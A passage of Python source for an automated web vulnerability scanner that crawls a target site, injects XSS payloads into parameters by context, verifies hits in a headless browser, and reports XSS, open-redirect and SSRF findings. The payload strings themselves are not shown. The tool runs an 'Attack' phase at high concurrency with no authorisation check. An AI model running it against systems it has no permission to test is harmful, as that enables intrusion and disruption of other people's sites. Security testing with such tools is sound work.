            pmap={
                'HTML_TAG':PAYLOADS.get('HTML_TAG',[]),
                'CONSUMING':PAYLOADS.get('CONSUMING',[]),
                'FOCUS':PAYLOADS.get('FOCUS',[]),
                'TRANSITION':PAYLOADS.get('TRANSITION',[]),
                'QUOTED_ATTR':PAYLOADS.get('QUOTED_ATTR',[]),
                'UNQUOTED_ATTR':PAYLOADS.get('UNQUOTED_ATTR',[]),
                'URI_ATTR':PAYLOADS.get('URI_ATTR',[]),
                'URI_UNQUOTED':PAYLOADS.get('URI_ATTR',[]),
                'EVENT_ATTR':PAYLOADS.get('JS_RAW',[]),
                'JS_STRING':PAYLOADS.get('JS_STRING',[]),
                'JS_RAW':PAYLOADS.get('JS_RAW',[]),
                'TEMPLATE':PAYLOADS.get('TEMPLATE',[]),
                'HTML_TEXT':PAYLOADS.get('HTML_TAG',[]),
                'JS_COMMENT':PAYLOADS.get('JS_COMMENT',[]),
                'GENERIC':PAYLOADS.get('HTML_TAG',[])+PAYLOADS.get('QUOTED_ATTR',[]),
            }
            
            payloads=pmap.get(ctx,[])
            to_run=[]
            for p,pt,ps,psc,pv in payloads:
                if psc<self.settings.filter:continue
                if 'HTML_FULL' in enc and('<' in p or '>' in p):
                    if not any(k in pt for k in['SCHEME','JS_RAW','B64','CONSTRUCTOR','TRANSITION','FOCUS']):continue
                to_run.append((p,pt,ps,psc,pv))
            
            if self.settings.mode=='QUICK' and to_run:
                unique={p[0]:p for p in to_run}
                to_run=sorted(unique.values(),key=lambda x:x[3],reverse=True)[:5]
            
            tested=set()
            for payload,ptype,sev,pscore,vtype in to_run:
                if shutdown.is_set():return
                if payload in tested:continue
                tested.add(payload)
                
                data=target.params.copy()
                data[param]=payload
                url=target.base
                if target.method=='GET':
                    query=urlencode(data,safe=':/<>"')
                    url=f"{target.base}?{query}"
                
                final_score=pscore+(5 if 'RAW' in enc and pscore<100 else 0)
                final_conf=min(1.0,conf*(pscore/100.0))
                f=Finding(vuln='XSS',type=ptype,severity=sev,score=final_score,base=target.base,url=url,param=param,payload=payload,verify_type=vtype,method=target.method,params=data,context=ctx,confidence=final_conf)
                self.verify_queue.put_nowait(f)
                if self.settings.mode=='QUICK' and final_score>=95:return

class Manager:
    def __init__(self,settings,client,browser=None):
        self.settings=settings
        self.client=client
        self.browser=browser
        self.pool=None
        self.verifier=None
        self.health=Health(self.settings,self)
        self.stats=Stats()
        
        if browser:
            cap=max(1,psutil.cpu_count(logical=False) or 4)*2
            self.pool=Pool(browser,cap)
            self.verifier=Verifier(settings,self.pool)
        
        self.targets=asyncio.Queue()
        self.verify_queue=asyncio.Queue()
        self.results=asyncio.Queue()
        self.findings=[]
        self.all_findings=[]
        self.shutdown=asyncio.Event()
        self.sem=asyncio.Semaphore(self.settings.concurrency)
        self.crawler=Crawler(self.client,self.settings,self.targets,self.sem,self.shutdown,self.pool)
        self.scanner=Scanner(self.client,self.settings,self.verify_queue)
        self.scanner.stats_ref=self.stats
    
    async def reset(self):
        if self.pool and self.browser:
            await self.pool.shutdown()
            cap=max(1,psutil.cpu_count(logical=False) or 4)*2
            self.pool=Pool(self.browser,cap)
            self.verifier=Verifier(self.settings,self.pool)
        
        self.findings.clear()
        for q in[self.targets,self.verify_queue,self.results]:
            while not q.empty():
                try:
                    q.get_nowait()
                    q.task_done()
                except:break
            await q.join()
        
        self.crawler=Crawler(self.client,self.settings,self.targets,self.sem,self.shutdown,self.pool)
        self.scanner=Scanner(self.client,self.settings,self.verify_queue)
        self.settings.reflect_tag=f"R{random.randint(10000,99999)}"
    
    async def run(self,url):
        domain=urlparse(url).netloc
        console.rule(f"[bold magenta]SCAN: {url}[/bold magenta]")
        self.stats=Stats()
        
        self.sem=asyncio.Semaphore(self.settings.concurrency)
        self.crawler.sem=self.sem
        
        if self.pool and not self.pool.ready.is_set():
            await self.pool.init()
        
        health_task=asyncio.create_task(self._health_worker())
        verify_task=None
        if self.settings.verify and self.verifier and self.pool and self.pool.ready.is_set():
            verify_task=asyncio.create_task(self._verify_worker())
        report_task=asyncio.create_task(self._report_worker())
        
        try:
            console.rule('[bold cyan]Phase 1: Crawl[/bold cyan]')
            crawl_progress=Progress(SpinnerColumn(),TextColumn('[progress.description]{task.description}'),BarColumn(),TextColumn('{task.completed} visited'),TimeElapsedColumn(),console=console)
            with crawl_progress:
                task_id=crawl_progress.add_task('Crawling...',total=None,completed=0)
                await self.crawler.crawl(url,crawl_progress,task_id)
            
            total=self.targets.qsize()
            self.stats.targets_found=total
            if total==0:
                console.print('[yellow]No targets found[/yellow]')
                return
            
            console.print(f"✅ Found {total} targets")
            console.print(self.stats.get_panel())
            console.rule('[bold magenta]Phase 2: Attack[/bold magenta]')
            
            scan_progress=Progress(TextColumn('[progress.description]{task.description}'),BarColumn(),TextColumn('{task.completed}/{task.total}'),TimeElapsedColumn(),console=console)
            with scan_progress:
                task_id=scan_progress.add_task('Attacking...',total=total)
                workers=[asyncio.create_task(self._scan_worker(scan_progress,task_id)) for _ in range(self.settings.concurrency)]
                await self.targets.put(None)
                await asyncio.gather(*workers)
            
            console.print('[dim]Waiting for verification...[/dim]')
            await self.verify_queue.put(None)
            if verify_task:await verify_task
            else:
                while True:
                    f=await self.verify_queue.get()
                    if f is None:break
                    self.results.put_nowait(f)
                    self.verify_queue.task_done()
            
            await self.results.put(None)
            await report_task
            
            verified=self.findings
            self.all_findings.extend(verified)
            if verified:
                self._save_json(domain,verified)
            
            console.rule(f"[bold green]RESULTS: {domain}[/bold green]")
            console.print(self._get_table(verified))
        finally:
            health_task.cancel()
            await asyncio.gather(health_task,return_exceptions=True)
            if verify_task and not verify_task.done():verify_task.cancel()
            if report_task and not report_task.done():report_task.cancel()
            await asyncio.gather(verify_task,report_task,return_exceptions=True)
            console.rule(f"[bold magenta]COMPLETE: {url}[/bold magenta]")
    
    def _save_json(self,domain,findings):
        os.makedirs('results',exist_ok=True)
        fname=f"results/{re.sub(r'[^\\w\\-_\\.]','_',domain)}_report.json"
        data={
            'timestamp':datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'target':domain,
            'total':len(findings),
            'findings':[{
                'vuln':f.vuln,
                'type':f.type,
                'severity':f.severity,
                'score':f.score,
                'verified':f.verified,
                'base':f.base,
                'url':f.url,
                'param':f.param,
                'method':f.method,
                'payload':f.payload,
                'context':f.context,
                'exploits':list(f.exploits),
                'payloads':list(f.payloads),
            } for f in findings]
        }
        try:
            with open(fname,'w',encoding='utf-8') as file:
                json.dump(data,file,indent=2)
            console.print(f"[yellow]Saved: {fname}[/yellow]")
        except Exception as e:
            log.error(f"Save failed: {e}")
    
    def _get_table(self,findings):
        table=Table(box=HEAVY_HEAD,header_style='bold magenta',show_lines=True,expand=True)
        table.add_column('V',justify='center',ratio=1)
        table.add_column('Score',style='yellow',ratio=1)
        table.add_column('Conf',style='cyan',ratio=1)
        table.add_column('Param',style='green',ratio=2)
        table.add_column('Type',style='cyan',ratio=3)
        table.add_column('Context',style='magenta',ratio=2)
        table.add_column('PoC',style='blue',ratio=5)
        
        filtered=[f for f in findings if f.score>=self.settings.filter]
        filtered.sort(key=lambda f:(not f.verified,-f.score))
        
        for f in filtered:
            icon=''
            if f.vuln=='OD':icon='[bold green]OD[/bold green]'
            elif f.vuln=='SSRF':icon='[bold yellow]SSRF[/bold yellow]'
            elif f.verified:icon='[green]✔[/green]'
            else:icon='[yellow]![/yellow]'
            
            color='red' if f.severity=='Critical' else 'orange' if f.severity=='High' else 'yellow'
            conf_color='green' if f.confidence>=0.8 else 'yellow' if f.confidence>=0.5 else 'red'
            table.add_row(
                icon,
                f"[{color}]{f.score}[/]",
                f"[{conf_color}]{int(f.confidence*100)}%[/]",
                f"[bold]{f.param}[/] ({f.method})",
                f"{f.type} ({f.severity})",
                f.context.replace('CONTEXT_','').replace('SINK:',''),
                f"[blue]{f.url}[/]"
            )
        
        if not filtered:
            table.add_row('[dim]•[/dim]','N/A','N/A','N/A','N/A','No findings')
        
        return table
    
    async def _health_worker(self):
        try:
            while not self.shutdown.is_set():
                await self.health.update()
                await asyncio.sleep(2)
        except asyncio.CancelledError:pass
        except Exception as e:log.error(f"Health worker error: {e}")
    
    async def _scan_worker(self,progress,task_id):
        try:
            while True:
                target=await self.targets.get()
                if target is None or self.shutdown.is_set():
                    self.targets.put_nowait(None)
                    self.targets.task_done()
                    break
                
                async with self.sem:
                    if self.shutdown.is_set():
                        self.targets.task_done()
                        break
                    try:
                        await asyncio.wait_for(self.scanner.scan(target,self.shutdown),timeout=self.settings.timeout*5)
                        self.stats.targets_scanned+=1
                    except asyncio.TimeoutError:
                        log.error(f"Scan timeout: {target.url}")
                    except Exception as e:
                        log.error(f"Scan error: {e}")
                    finally:
                        progress.update(task_id,advance=1,description=f"[cyan]Attacking[/cyan] | Found: {self.stats.findings} | Verified: {self.stats.verified}")
                        self.targets.task_done()
        except asyncio.CancelledError:pass
        except Exception as e:log.error(f"Scan worker error: {e}")
    
    async def _verify_worker(self):
        if not self.verifier:return
        cap=max(1,psutil.cpu_count(logical=False) or 4)*2
        sem=asyncio.Semaphore(cap)
        active=set()
        
        async def verify_one(finding):
            async with sem:
                if self.shutdown.is_set():return
                try:
                    if finding.vuln in['OD','SSRF']:
                        finding.verified=True
                    else:
                        verified=await asyncio.wait_for(self.verifier.verify(finding),timeout=self.settings.timeout*4)
                        finding.verified=verified
                except asyncio.TimeoutError:
                    finding.verified=False
                except Exception as e:
                    log.error(f"Verify error: {e}")
                    finding.verified=False
                self.results.put_nowait(finding)
        
        try:
            while True:
                f=await self.verify_queue.get()
                if f is None:
                    self.verify_queue.task_done()
                    break
                task=asyncio.create_task(verify_one(f))
                active.add(task)
                task.add_done_callback(active.discard)
                self.verify_queue.task_done()
        except asyncio.CancelledError:pass
        finally:
            if active:await asyncio.gather(*active,return_exceptions=True)
    
    async def _report_worker(self):
        unique={}
        try:
            while True:
                f=await self.results.get()
                if f is None:
                    self.results.task_done()
                    break
                
                if (f.verified or f.vuln in['OD','SSRF']) and f.score>=self.settings.filter:
                    self.stats.findings+=1
                    if f.verified:self.stats.verified+=1
                    if f.confidence>=0.8:self.stats.high_confidence+=1
                    key=(f.vuln,f.base,f.param,f.method)
                    if key not in unique:
                        f.exploits.add(f.type)
                        f.payloads.add(f.payload)
                        unique[key]=f
                    else:
                        existing=unique[key]
                        if f.score>existing.score:
                            existing.score=f.score
                            existing.type=f.type
                            existing.payload=f.payload
                        existing.exploits.add(f.type)
                        existing.payloads.add(f.payload)
                        existing.verified=existing.verified or f.verified
                
                self.results.task_done()
        except asyncio.CancelledError:pass
        except Exception as e:log.error(f"Report worker error: {e}")
        finally:
            self.findings.extend(unique.values())

async def main():
    parser=argparse.ArgumentParser(description='Advanced Security Scanner')
    parser.add_argument('-u','--url',help='Target URL')
    parser.add_argument('-f','--file',help='Target file')
    parser.add_argument('-d','--depth',type=int,default=15,help='Crawl depth (default: 15)')
    parser.add_argument('--mode',choices=['QUICK','COMPREHENSIVE'],default='COMPREHENSIVE',help='Scan mode')
    parser.add_argument('--crawl',choices=['static','dynamic'],default='static',help='Crawl mode')
    parser.add_argument('--no-verify',action='store_false',dest='verify',help='Disable verification')
    parser.add_argument('--debug',action='store_true',help='Debug browser')
    parser.add_argument('-c','--concurrency',type=int,default=200,help='Concurrency')
    parser.add_argument('-t','--timeout',type=int,default=15,help='Timeout')
    parser.add_argument('--max-targets',type=int,default=5000,help='Max targets')
    args=parser.parse_args()
    
    if not args.url and not args.file:
        console.print('[red]Provide -u URL or -f FILE[/red]')
        return
    
    settings=Settings(
        mode=args.mode,
        crawl=args.crawl,
        depth=args.depth,
        verify=args.verify,
        debug=args.debug,
        concurrency=args.concurrency,
        timeout=args.timeout,
        max_targets=args.max_targets
    )
    
    console.print(Panel(Align.center('🚀 [bold]Security Scanner[/bold] 🚀'),border_style='blue'))
    
    client=None
    playwright=None
    browser=None
    manager=None
    shutdown=asyncio.Event()
    
    def handle_shutdown(*_):
        console.print('\n[yellow]Shutting down...[/yellow]')
        shutdown.set()
        if manager:manager.shutdown.set()
    
    signal.signal(signal.SIGINT,handle_shutdown)
    try:signal.signal(signal.SIGTERM,handle_shutdown)
    except:pass
    
    try:
        headers={
            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        }
        timeout_obj=httpx.Timeout(settings.timeout,connect=settings.timeout,read=settings.timeout)
        client=httpx.AsyncClient(verify=False,headers=headers,timeout=timeout_obj)
        
        if settings.verify or settings.crawl=='dynamic':
            try:
                playwright=await async_playwright().start()
                browser=await playwright.chromium.launch(headless=not settings.debug)
            except Exception as e:
                console.print(f'[red]Browser launch failed: {e}[/red]')
                settings.verify=False
                settings.crawl='static'
        
        manager=Manager(settings,client,browser)
        manager.shutdown=shutdown
        
        if args.url:
            url=args.url if args.url.startswith('http') else f"http://{args.url}"
            await manager.run(url)
        elif args.file:
            try:
                with open(args.file,'r') as f:
                    urls=[line.strip() for line in f if line.strip() and not line.startswith('#')]
                if not urls:
                    console.print('[yellow]No URLs in file[/yellow]')
                else:
                    for i,url in enumerate(urls,1):
                        if shutdown.is_set():break
                        url=url if url.startswith('http') else f"http://{url}"
                        await manager.run(url)
                        if i<len(urls):await manager.reset()
            except FileNotFoundError:
                console.print(f'[red]File not found: {args.file}[/red]')
    except asyncio.CancelledError:
        handle_shutdown()
    finally:
        if manager and manager.pool:await manager.pool.shutdown()
        if client:await client.aclose()
        if browser:await browser.close()
        if playwright:await playwright.stop()
        console.print('[green]Shutdown complete[/green]')

if __name__=='__main__':
    if sys.version_info<(3,8):
        console.print('[red]Requires Python 3.8+[/red]')
        sys.exit(1)
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console.print('\n[red]Forced exit[/red]')